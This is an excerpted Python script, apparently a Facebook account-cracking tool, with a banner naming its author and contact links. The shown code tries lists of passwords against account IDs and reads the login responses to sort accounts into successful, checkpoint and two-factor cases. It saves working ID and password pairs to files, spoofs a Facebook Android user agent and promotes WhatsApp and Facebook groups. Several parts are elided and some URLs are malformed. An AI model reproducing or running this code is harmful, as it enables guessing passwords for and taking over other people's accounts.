...
\x1b[1;91m---------------------------------------
\x1b[1;97m> Author : Sajid  Khan
\x1b[1;97m> Github : https://github.com/Queen3099
\x1b[1;97m> Facebok: Saj8d_KTK
\x1b[1;97m> Version: 1.0.8
\033[1;37m---------------------------------------""" )
def my_main():
    os.system("clear")
    print(logo)
        ...
        for px in pp:
          ...
          #  print (ua)
            ...
            if 'session_key' in response.text:
                print('\r{}\033[1;92m [Sajid -OK] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/Sajid /Sajid -OK.txt','a').write(f'{url}|{px}\n')
                oku.append(url)
                break
            elif 'checkpoint' in response.text:
                print('\r{}\033[1;91m[Checkpiont] {} {} {} {}'.format(G, url, fax, px, mys))
                cpu.append(url)
                open('/sdcard/Sajid /Sajid -CP.txt','a').write(f'{url}|{px}\n')
                break
            elif 'Login approvals are on' in response.text:
                print('\r{}\033[1;94m[2F-Sajid ] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/Sajid /Sajid -2F.txt','a').write(f'{url}|{px}\n')
            else:
                #print(response.text)
                continue
        sys.stdout.write('\r{} [Sajid -XD] [{}|{}] [OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
        sys.stdout.flush()
        loop += 1       
...
def group():
    ...
    Sajid =input(' [•] Choose : ')
    if Sajid  == '1':
        os.system('xdg-open https://wa.me/+92490093530?text=')
        menu()
    if Sajid  == '2':
        os.system('xdg-open https://https://chat.whatsapp.com/IydEH4gtd50EM1kVu9akBc');menu()
    if Sajid  == '3':
        os.system('xdg-open https://https://www.facebook.com/groups/1494214747788957/?ref=share/');menu()
    if Sajid  == '0':
        menu()
    else:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m[Sajid -XD] [%s] [\033[1;37mOK : %s ] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                     ...
                     #   ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.75,width=720,height=1640};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/Sajid /Sajid -OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/Sajid /Sajid -CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
